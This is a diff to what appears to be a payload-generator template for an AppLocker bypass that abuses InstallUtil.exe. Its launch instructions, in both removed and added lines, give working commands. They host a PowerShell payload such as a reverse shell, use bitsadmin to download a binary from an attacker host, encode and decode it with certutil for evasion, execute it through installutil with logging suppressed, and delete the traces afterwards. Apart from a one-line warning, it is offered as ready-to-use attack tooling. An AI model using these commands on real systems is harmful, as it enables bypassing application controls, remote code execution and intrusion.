@@ -1,20 +1,20 @@
 meta:
-  name: "AppLocker Bypass via InstallUtil (C#)"
+  name: "AppLocker Bypass via InstallUtil (C#)*"
   category: "Defense Evasion"
   description: |
     Bypass AppLocker application whitelisting using Microsoft-signed InstallUtil.exe.
-    
+
     Features:
     - Uses Microsoft-signed binary (InstallUtil.exe) to execute code
     - PowerShell runspace for arbitrary code execution
     - Downloads and executes remote PowerShell payload
     - Bypasses AppLocker default rules
     - Can be encoded with CertUtil for additional obfuscation
-    
+
     This technique exploits the fact that AppLocker default rules allow
     execution of binaries in C:\\Windows\\Microsoft.NET\\ directory.
     InstallUtil.exe will execute code from [RunInstaller(true)] decorated classes.
-    
+
     WARNING: For authorized security testing only!
 
   effectiveness: "high"
@@ -58,41 +58,61 @@ output:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -r:System.Management.Automation.dll -r:System.Configuration.Install.dll {{ source_file }}"
   launch_instructions: |
-    C# AppLocker Bypass via InstallUtil - Launch Instructions
+    # Host Payload (run.txt)
 
-    Host Payload (run.txt):
     Create run.txt with PowerShell payload (reverse shell, Invoke-PowerShellTcp, etc.)
-    $ python3 -m http.server 80
+    ```bash
+    python3 -m http.server 80
+    ```
 
-    Transfer and Execute:
-    $ python3 -m http.server 80
-    $ bitsadmin /Transfer theJob http://{{ lhost }}/{{ output_file }} C:\Windows\Tasks\{{ output_file }} && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\{{ output_file }}
+    # Transfer and Execute
 
-    Alternative (Encoded for Evasion):
-    $ certutil -encode {{ output_file }} bypass_encoded.txt
-    $ python3 -m http.server 80
-    $ bitsadmin /Transfer job http://{{ lhost }}/bypass_encoded.txt C:\Windows\Tasks\enc.txt && certutil -decode C:\Windows\Tasks\enc.txt C:\Windows\Tasks\bypass.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
+    ```bash
+    python3 -m http.server 80
+    ```
 
-    Notes:
+    **Target:**
+    ```cmd
+    bitsadmin /Transfer theJob http://YOUR_IP:/{{ output_file }} C:\Windows\Tasks\{{ output_file }} && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\{{ output_file }}
+    ```
+
+    # Alternative (Encoded for Evasion)
+
+    ```bash
+    certutil -encode {{ output_file }} bypass_encoded.txt
+    python3 -m http.server 80
+    ```
+
+    **Target:**
+    ```cmd
+    bitsadmin /Transfer job http://YOUR_IP:/bypass_encoded.txt C:\Windows\Tasks\enc.txt && certutil -decode C:\Windows\Tasks\enc.txt C:\Windows\Tasks\bypass.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
+    ```
+
+    # Notes
+
     - InstallUtil.exe is Microsoft-signed and allowed by default AppLocker rules
-    - Payload host: {{ payload_host }}/run.txt (PowerShell payload downloaded via WebClient)
+    - Payload host: `{{ payload_host }}/run.txt` (PowerShell payload downloaded via WebClient)
     - PowerShell runspace executes in-memory (no PowerShell.exe process spawned)
-    - /U triggers Uninstall method which executes payload
-    - /logfile= prevents log file creation
+    - `/U` triggers Uninstall method which executes payload
+    - `/logfile=` prevents log file creation
     - Executes with current user privileges (no elevation required)
     - Alternative LOLBins: MSBuild.exe, RegSvr32.exe (SCT files), RegAsm.exe
-    - Chain BitsAdmin (download) -> CertUtil (decode) -> InstallUtil (execute) for multi-stage obfuscation
+    - Chain BitsAdmin (download) → CertUtil (decode) → InstallUtil (execute) for multi-stage obfuscation
 
-    Troubleshooting:
-    - AppLocker still blocks: Verify InstallUtil.exe path (C:\Windows\Microsoft.NET\Framework64\v4.0.30319\) is whitelisted
-    - No payload download: Check network connectivity, firewall, and verify payload_host is accessible
-    - Assembly not found: Ensure .NET Framework 4.0+ is installed on target
-    - Error loading automation: System.Management.Automation.dll missing (requires PowerShell)
+    # Troubleshooting
+
+    - **AppLocker still blocks:** Verify InstallUtil.exe path (`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\`) is whitelisted
+    - **No payload download:** Check network connectivity, firewall, and verify payload_host is accessible
+    - **Assembly not found:** Ensure .NET Framework 4.0+ is installed on target
+    - **Error loading automation:** System.Management.Automation.dll missing (requires PowerShell)
     - Sysmon Event ID 1 fires for InstallUtil.exe execution
     - Network connections from InstallUtil.exe may alert EDR
 
-    Cleanup:
-    On target:
-    $ del C:\Windows\Tasks\{{ output_file }}
-    $ del C:\Windows\Tasks\bypass.exe
-    $ del C:\Windows\Tasks\enc.txt
+    # Cleanup
+
+    **On target:**
+    ```cmd
+    del C:\Windows\Tasks\{{ output_file }}
+    del C:\Windows\Tasks\bypass.exe
+    del C:\Windows\Tasks\enc.txt
+    ```
